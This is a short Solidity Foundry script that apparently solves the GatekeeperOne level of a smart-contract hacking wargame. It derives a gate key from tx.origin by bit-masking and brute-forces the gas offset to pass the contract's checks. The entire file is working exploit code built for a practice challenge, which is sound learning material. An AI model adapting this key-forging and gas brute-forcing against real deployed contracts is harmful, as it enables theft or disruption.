// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import{Script,console} from "forge-std/Script.sol";
import{GatekeeperOne} from "../src/Level13.sol";

contract Helper{
    GatekeeperOne instance=GatekeeperOne(0xF739d895bd82bA66dc60C77AA4CA71eB42A0F5D0);
    

    function exploit() external{
        console.log(tx.origin);
        console.log("msg sender",msg.sender);
        bytes8 gateKey=bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        for(uint256 i=0;i<1000;i++){      // i gas is consumed before the gasLeft statement is executed then onnly 8191 multiple is remaining            
                (bool success,)=address(instance).call{gas:i+8191*3}(abi.encodeWithSignature("enter(bytes8)", gateKey));
                if(success){
                    console.log("gas i:",i);
                    break;
                }
        }
    }
}
contract Level13Solution is Script{
        function run() external{
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            Helper h=new Helper();
            h.exploit();
            vm.stopBroadcast();
    }
}